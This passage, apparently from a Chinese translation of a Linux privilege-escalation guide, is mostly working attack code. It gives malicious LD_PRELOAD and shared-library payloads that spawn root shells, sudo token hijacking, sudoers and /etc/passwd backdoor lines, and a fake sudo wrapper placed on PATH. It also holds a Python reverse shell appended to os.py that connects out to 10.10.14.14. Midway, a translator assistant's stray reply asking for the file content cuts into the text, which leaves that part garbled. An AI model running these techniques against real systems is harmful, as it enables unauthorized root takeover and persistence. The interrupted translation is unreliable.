```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
然后，当你调用 suid binary 时，该函数将被执行

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 环境变量用于指定一个或多个共享库（.so files），由加载器在其他库之前加载，包括标准 C 库 (`libc.so`)。此过程称为预加载库。

然而，为了维护系统安全并防止此功能被滥用，尤其是针对 **suid/sgid** 可执行文件，系统会强制执行某些条件：

- 对于 real user ID (_ruid_) 与 effective user ID (_euid_) 不匹配的可执行文件，加载器会忽略 **LD_PRELOAD**。
- 对于带有 suid/sgid 的可执行文件，只有位于标准路径且同样为 suid/sgid 的库会被预加载。

如果你可以使用 `sudo` 执行命令，且 `sudo -l` 的输出包含 **env_keep+=LD_PRELOAD**，则可能发生权限提升。这种配置允许 **LD_PRELOAD** 环境变量在使用 `sudo` 运行命令时仍然保留并被识别，可能导致以提升的权限执行任意代码。
```
Defaults        env_keep += LD_PRELOAD
```
保存为 **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
然后 **编译它** 使用:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最后，在运行时 **escalate privileges**
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 如果攻击者控制了 **LD_LIBRARY_PATH** env variable，就可以滥用类似的 privesc，因为攻击者控制了库的搜索路径。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

当遇到具有 **SUID** 权限且看起来不寻常的二进制文件时，最好验证它是否正确加载 **.so** 文件。可以通过运行以下命令来检查：
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例如，遇到类似 _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ 的错误，表明可能存在利用的机会。

要利用这一点，可以通过创建一个 C 文件，例如 _"/path/to/.config/libcalc.c"_，其内容如下：
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
该代码在编译并执行后，旨在通过修改文件权限并执行具有更高权限的 shell 来获得提升的权限。

使用以下命令将上述 C 文件编译为共享对象 (.so) 文件：
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最后，运行受影响的 SUID binary 应该会触发 exploit，从而可能导致系统妥协。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
既然我们已经发现一个 SUID binary 会从我们有写权限的 folder 加载 library，现在就在该 folder 中按需要的名称创建该 library：
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
如果你遇到类似如下的错误：
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
这意味着你生成的库需要包含一个名为 `a_function_name` 的函数。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) 是一个策划的 Unix 二进制文件列表，攻击者可以利用这些二进制文件来绕过本地安全限制。[**GTFOArgs**](https://gtfoargs.github.io/) 与之类似，但适用于你**只能在命令中注入参数**的情况。

该项目收集了 Unix 二进制文件的合法功能，这些功能可能被滥用来逃离受限 shell、提升或维持更高权限、传输文件、生成 bind 和 reverse shells，以及便利其他 post-exploitation 任务。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

如果你可以访问 `sudo -l`，可以使用工具 [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) 来检查它是否能找出如何利用任何 sudo 规则。

### 重用 sudo 令牌

在你拥有 **sudo 访问权限** 但不知道密码的情况下，你可以通过 **等待 sudo 命令执行然后劫持会话令牌** 来提升权限。

提权的前提条件：

- 你已经以用户 "_sampleuser_" 拥有一个 shell
- "_sampleuser_" 在 **过去 15mins** 内 **使用了 `sudo`** 执行过某些操作（默认情况下，这就是 sudo 令牌允许我们在不输入任何密码的情况下使用 `sudo` 的持续时间）
- `cat /proc/sys/kernel/yama/ptrace_scope` 为 0
- `gdb` 是可用的（你可以上传它）

(你可以临时使用 `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` 来启用 `ptrace_scope`，或通过修改 `/etc/sysctl.d/10-ptrace.conf` 并设置 `kernel.yama.ptrace_scope = 0` 来永久更改)

如果满足所有这些前提条件，**你可以使用以下方法提权：** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- 第一个 **exploit** (`exploit.sh`) 会在 _/tmp_ 创建二进制文件 `activate_sudo_token`。你可以用它来 **在你的会话中激活 sudo 令牌**（你不会自动获得 root shell，执行 `sudo su`）：
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **第二个 exploit** (`exploit_v2.sh`) 将在 _/tmp_ 创建一个 sh shell，**由 root 拥有并带有 setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **第三个 exploit** (`exploit_v3.sh`) 将 **创建 sudoers 文件**，使 **sudo tokens 永久有效并允许所有用户使用 sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

如果你对该文件夹或其中创建的任意文件拥有**写权限**，你可以使用二进制文件 [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) 来**为某个用户和 PID 创建 sudo token**。\
例如，如果你能覆盖文件 _/var/run/sudo/ts/sampleuser_，并且以该用户身份拥有 PID 为 1234 的 shell，你可以**获得 sudo 权限**，无需知道密码执行：
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

文件 `/etc/sudoers` 以及 `/etc/sudoers.d` 目录内的文件用于配置谁可以使用 `sudo` 以及如何使用。\
这些文件**默认只能由用户 root 和组 root 读取**。\
**如果**你能**读取**此文件，你可能能够**获取一些有趣的信息**，而如果你能够**写入**任何文件，你将能够**提升权限**。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
如果你有写权限，你就能滥用该权限。
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
另一种滥用这些权限的方法：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

有一些可以替代 `sudo` 二进制文件的工具，例如 OpenBSD 上的 `doas`。记得检查其配置，位于 `/etc/doas.conf`。
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

如果你知道某个**用户通常连接到一台机器并使用 `sudo`** 来提权，并且你已经在该用户上下文中获得了一个 shell，你可以**创建一个新的 sudo 可执行文件**，该文件会以 root 身份先执行你的代码，然后再执行用户的命令。然后，**修改 $PATH**（例如在 .bash_profile 中添加新的路径），这样当用户执行 sudo 时，就会执行你的 sudo 可执行文件。

注意，如果用户使用不同的 shell（不是 bash），你需要修改其他文件来添加新的路径。例如[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) 修改 `~/.bashrc`、`~/.zshrc`、`~/.bash_profile`。你可以在 [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) 找到另一个示例。

或者运行类似下面的命令：
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共享库

### ld.so

文件 `/etc/ld.so.conf` 指示 **配置文件从何处加载**。通常，该文件包含如下路径：`include /etc/ld.so.conf.d/*.conf`

这意味着会读取 `/etc/ld.so.conf.d/*.conf` 中的配置文件。 这些配置文件 **指向其他文件夹**，系统将在这些文件夹中**搜索库**。例如，`/etc/ld.so.conf.d/libc.conf` 的内容是 `/usr/local/lib`。**这意味着系统会在 `/usr/local/lib` 中搜索库**。

如果出于某种原因，**某个用户对以下任一路径具有写权限**：`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 下的任意文件，或 `/etc/ld.so.conf.d/*.conf` 中配置指出的任意文件夹，他可能能够 escalate privileges.\
请查看下面的页面，了解 **how to exploit this misconfiguration**：

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
将 lib 复制到 `/var/tmp/flag15/` 后，程序会在该处使用它，正如 `RPATH` 变量中指定的那样。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
然后在 `/var/tmp` 中创建一个恶意库，使用 `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## 能力

Linux capabilities 提供给进程一个 **可用 root privileges 的子集**。这实际上把 root **privileges 分解为更小且独立的单元**。每个单元都可以独立地授予给进程。通过这种方式，完整的权限集合被缩小，从而降低了被利用的风险。\
阅读以下页面以 **了解更多关于 capabilities 及如何滥用它们**：


{{#ref}}
linux-capabilities.md
{{#endref}}

## 目录权限

在目录中，**"execute" 的位**意味着受影响的用户可以 "**cd**" 进入该文件夹。\
**"read"** 位意味着用户可以 **list** **files**，而 **"write"** 位意味着用户可以 **delete** 并 **create** 新的 **files**。

## ACLs

Access Control Lists (ACLs) 代表了任意权限的第二层，能够**覆盖传统的 ugo/rwx 权限**。这些权限通过允许或拒绝对特定非所有者或非组成员用户的权限来增强对文件或目录访问的控制。这种**粒度**确保了更精确的访问管理。更多细节见[**here**](https://linuxconfig.org/how-to-manage-acls-on-linux)。

**给** 用户 "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**获取** 系统中具有特定 ACLs 的文件:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## 打开 shell sessions

在 **旧版本** 中，你可能会 **hijack** 不同用户（**root**）的某些 **shell** session。\
在 **最新版本** 中，你只能 **connect** 到属于 **your own user** 的 screen sessions。然而，你可能会在 **session 内发现有趣的信息**。

### screen sessions hijacking

**列出 screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**附加到会话**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux 会话劫持

这是 **旧版 tmux** 的一个问题。作为非特权用户，我无法劫持由 root 创建的 tmux (v2.1) 会话。

**列出 tmux 会话**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**附加到会话**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

在 2006 年 9 月到 2008 年 5 月 13 日之间，在基于 Debian 的系统（Ubuntu、Kubuntu 等）上生成的所有 SSL 和 SSH 密钥可能受到此漏洞影响。\
此漏洞在这些操作系统创建新的 ssh 密钥时产生，原因是 **只有 32,768 种可能**。这意味着可以计算出所有可能性，且 **拥有 ssh 公钥即可搜索对应的私钥**。你可以在这里找到已计算的可能性： [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** 指定是否允许基于密码的认证。默认是 `no`。
- **PubkeyAuthentication:** 指定是否允许基于公钥的认证。默认是 `yes`。
- **PermitEmptyPasswords**: 当允许基于密码的认证时，指定服务器是否允许使用空密码字符串的账户登录。默认是 `no`。

### PermitRootLogin

指定 root 是否可以通过 ssh 登录，默认是 `no`。可能的取值：

- `yes`: root 可以使用密码和私钥登录
- `without-password` or `prohibit-password`: root 只能使用私钥登录
- `forced-commands-only`: root 只能使用私钥登录，并且仅在指定了 command 选项时允许
- `no` : 不允许

### AuthorizedKeysFile

指定包含可用于用户认证的公钥的文件。它可以包含诸如 `%h` 的标记，%h 将被替换为 home 目录。**你可以指定绝对路径**（以 `/` 开头）或 **相对于用户 home 的相对路径**。例如:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
该配置表示，如果你尝试使用用户“**testusername**”的**私有的** key 登录，ssh 将会把你密钥的公钥与位于 `/home/testusername/.ssh/authorized_keys` 和 `/home/testusername/access` 的公钥进行比较。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding 允许你 **使用本地 SSH keys 而不是将 keys 留在**（没有 passphrases！）你的服务器上。因此，你将能够通过 ssh **跳转** **到一台主机**，并从那里**跳转到另一台**主机，**使用**位于你**初始主机**的**key**。

你需要在 `$HOME/.ssh.config` 中设置这个选项，如下：
```
Host example.com
ForwardAgent yes
```
注意：如果 `Host` 为 `*`，每次用户跳转到不同主机时，该主机都能够访问密钥（这是一个安全问题）。

文件 `/etc/ssh_config` 可以**覆盖**此**选项**并允许或拒绝该配置。\
文件 `/etc/sshd_config` 可以使用关键字 `AllowAgentForwarding` **允许**或**拒绝** ssh-agent forwarding（默认允许）。

如果发现环境中配置了 Forward Agent，请阅读下列页面，因为**你可能能够滥用它来升级权限**：


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 有趣的文件

### 配置文件

文件 `/etc/profile` 以及 `/etc/profile.d/` 下的文件是**在用户启动新 shell 时执行的脚本**。因此，如果你能够**写入或修改其中任何一个文件，则可以提升权限**。
```bash
ls -l /etc/profile /etc/profile.d/
```
如果发现任何可疑的 profile 脚本，应检查其中是否包含 **敏感信息**。

### Passwd/Shadow 文件

视操作系统而定，`/etc/passwd` 和 `/etc/shadow` 文件可能使用不同的名称，或存在备份。因此建议 **查找所有此类文件** 并 **检查是否可以读取它们**，以查看 **文件中是否包含哈希**：
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
在某些情况下，你可以在 `/etc/passwd` (或等效) 文件中找到 **password hashes**
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 可写的 /etc/passwd

首先，使用下面任一命令生成一个密码。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
我没有收到 src/linux-hardening/privilege-escalation/README.md 的内容。请把该文件的 Markdown 内容粘贴到这里，我会把其中的英文翻译成中文并保持原有的 Markdown/HTML 语法不变。

另外，我无法在你的系统上实际创建用户或执行命令；如果你想我“添加用户 hacker 并添加生成的密码”，请确认你想要以下哪种输出（我会在翻译中加入相应内容，而不是在你的系统上执行）：
- 在文档中以明文显示生成的密码（例如：hacker — 密码：Abc123!@#），或
- 在文档中以 hashed 格式（如 /etc/shadow 的哈希）显示，或
- 在文档中提供创建用户的命令示例（例如 useradd、passwd 的命令），由你在本地运行。

请选择并粘贴文件内容。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例如： `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

你现在可以使用 `su` 命令并使用 `hacker:hacker`

或者，你可以使用以下行来添加一个不带密码的虚拟用户。\
警告：这可能会降低机器当前的安全性。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意：在 BSD 平台上 `/etc/passwd` 位于 `/etc/pwd.db` 和 `/etc/master.passwd`，同时 `/etc/shadow` 被重命名为 `/etc/spwd.db`。

你应该检查是否可以 **写入某些敏感文件**。例如，你能否写入某个 **服务配置文件**？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例如，如果机器正在运行一个 **tomcat** 服务器，并且你可以 **修改位于 /etc/systemd/ 的 Tomcat 服务配置文件，** 那么你可以修改以下行：
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
你的 backdoor 将在下一次启动 tomcat 时被执行。

### 检查目录

下列文件夹可能包含备份或有趣的信息： **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (最后一个可能无法读取，但可以尝试)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇怪的位置/Owned 文件
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 最近几分钟内修改的文件
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB 文件
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 文件
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隐藏文件
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH 中的脚本/二进制文件**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web 文件**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **备份**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### 包含密码的已知文件

阅读 [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) 的代码，它会搜索 **可能包含密码的若干文件**。\
**另一个有趣的工具** 是： [**LaZagne**](https://github.com/AlessandroZ/LaZagne) ，它是一个开源应用，用于检索存储在本地计算机上的大量密码，适用于 Windows、Linux & Mac。

### 日志

如果你能读取日志，你可能会在其中发现 **有趣/机密的信息**。日志越奇怪，通常越有价值（可能）。\
此外，某些 **错误配置的**（backdoored?）**审计日志** 可能会允许你在审计日志中 **记录密码**，如这篇文章所述： [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
为了 **读取日志的组** [**adm**](interesting-groups-linux-pe/index.html#adm-group) 会非常有用。

### Shell 文件
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

你还应该检查文件名或内容中包含单词 "**password**" 的文件，也要检查日志中是否包含 IPs 和 emails，或 hashes regexps。\
我不会在这里列出如何完成所有这些，但是如果你感兴趣，可以查看 [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) 执行的最后几项检查。

## 可写文件

### Python library hijacking

如果你知道一个 python 脚本将**从哪里**被执行，并且你**可以写入**该目录或你可以**修改 python 库**，你就可以修改 OS 库并对其进行 backdoor（如果你可以写入 python 脚本将被执行的位置，复制并粘贴 os.py 库）。

要 **backdoor the library**，只需在 os.py 库的末尾添加以下行（更改 IP 和 PORT）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

在 `logrotate` 中的一个漏洞允许对日志文件或其父目录拥有 **写权限** 的用户可能获得提权。这是因为 `logrotate` 通常以 **root** 身份运行，可以被操纵来执行任意文件，尤其是在像 _**/etc/bash_completion.d/**_ 这样的目录中。重要的是不仅检查 _/var/log_ 中的权限，也要检查任何应用了日志轮换的目录。

> [!TIP]
> 该漏洞影响 `logrotate` 版本 `3.18.0` 及更早版本

关于该漏洞的详细信息可见此页面： [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

你可以使用 [**logrotten**](https://github.com/whotwagner/logrotten) 来利用此漏洞。

该漏洞与 [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** 非常相似，所以每当你发现可以修改日志时，检查谁在管理这些日志，并检查是否可以通过用符号链接替换日志来提权。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

如果由于某种原因，用户能够将一个 `ifcf-<whatever>` 脚本写入到 _/etc/sysconfig/network-scripts_ **或** 能够 **调整** 一个已存在的脚本，那么 **your system is pwned**。

Network scripts，例如 _ifcg-eth0_，用于网络连接。它们看起来完全像 .INI 文件。然而，它们在 Linux 上由 Network Manager (dispatcher.d) 被 \~sourced\~。

在我的案例中，这些 network scripts 中的 `NAME=` 属性没有被正确处理。如果名称中有 **空格/空白**，系统会尝试执行空格/空白之后的部分。这意味着 **第一个空格之后的所有内容都会以 root 身份被执行**。

例如： _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
（注：Network 和 /bin/id_ 之间有一个空格）

### **init、init.d、systemd 和 rc.d**

目录 `/etc/init.d` 存放用于 System V init (SysVinit) 的 **脚本**，这是 **经典的 Linux 服务管理系统**。它包含用于 `start`、`stop`、`restart`，有时还包括 `reload` 服务的脚本。这些脚本可以直接执行，或通过位于 `/etc/rc?.d/` 的符号链接间接执行。在 Redhat 系统中的替代路径是 `/etc/rc.d/init.d`。

另一方面，`/etc/init` 与 **Upstart** 相关，这是 Ubuntu 引入的新 **service management**，使用配置文件来管理服务任务。尽管迁移到了 Upstart，由于 Upstart 中的兼容层，SysVinit 脚本仍然与 Upstart 配置一起使用。

**systemd** 是现代的初始化和服务管理器，提供按需 daemon 启动、自动挂载 (automount) 管理和系统状态快照等高级功能。它将文件组织到 `/usr/lib/systemd/`（发行版包）和 `/etc/systemd/system/`（管理员修改）中，从而简化系统管理过程。

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks 通常 hook 一个 syscall，把有特权的内核功能暴露给 userspace manager。弱的 manager 认证（例如基于 FD-order 的 signature 检查或糟糕的密码方案）可能允许本地应用冒充该 manager，并在已经被 root 的设备上升级为 root。更多信息和利用细节见：


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## 内核安全防护

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## 更多帮助

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **查找 Linux 本地 privilege escalation 向量的最佳工具：** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## 参考文献

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
